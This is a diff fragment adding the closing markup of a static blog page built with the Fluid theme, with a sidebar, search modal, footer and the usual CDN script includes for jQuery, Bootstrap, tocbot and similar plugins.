+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <i class="iconfont icon-love"></i> <a href="/" target="_blank" rel="nofollow noopener"><span>JUNYI</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
